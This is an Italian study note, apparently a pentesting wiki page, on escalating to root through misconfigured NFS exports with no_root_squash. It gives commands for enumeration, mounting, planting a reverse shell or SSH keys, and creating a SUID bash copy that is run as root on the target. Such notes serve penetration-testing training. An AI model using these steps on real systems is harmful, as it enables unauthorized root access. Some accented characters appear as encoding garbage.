#Privesc_Linux

---
---
---
#### INDICE

- [[#Introduzione]]
- [[#Enumerazione]]
- [[#Montaggio Remoto]]
- [[#no_root_squash]]

---
---
---
### Introduzione
**NFS (Network File System)** Ã¨ un protocollo che consente di condividere directory tra sistemi su rete, rendendole montabili come se fossero locali.  
In scenari compromessi, configurazioni deboli o errate di NFS permettono a un attaccante di ottenere privilegi elevati, spesso fino a _root_, grazie all'opzione `no_root_squash`.

---
### Enumerazione
Per scoprire export NFS disponibili:

```
showmount -e <IP>
```

Output:

```
Export list for 10.10.10.10: /home *(rw,sync,no_root_squash)
```

> Se il flag `no_root_squash` Ã¨ presente, significa che lâ€™utente `root` sul client **mantiene i suoi privilegi** anche sulla share remota.

---
### Montaggio Remoto
Per montare la directory esportata:

```
mkdir /mnt/nfs mount -t nfs <IP>:/home /mnt/nfs
```

Verifica i permessi:

```
touch /mnt/nfs/test.txt
```

> Se si hanno i permessi in scrittura, **si puÃ² caricare un payload malevolo**
>
>- Caricare[[ðŸ”¡ Glossario#Reverse shell| reverse shellÂ°]], script o[[Cronjobs | cronjobs]]
>- Iniettare chiavi in `~/.ssh/authorized_keys`
>- Creare link simbolici verso file sensibili
>- Copiare `.so` o eseguibili in directory importate dal sistema


---
### no_root_squash
Normalmente, quando un utente `root` accede a una share NFS, viene mappato a `nfsnobody` â†’ ciÃ² impedisce escalation.

Ma se la configurazione esporta con `no_root_squash`, allora `root` **resta root** anche nella share.  
Questo permette di creare **binari SUID** direttamente dalla macchina client.

```
cp /bin/bash /mnt/nfs/rootbash
chmod +s /mnt/nfs/rootbash    #Monta la share con permessi no_root_squash
```

Sulla macchina target, esegui:

```
/home/rootbash -p
```

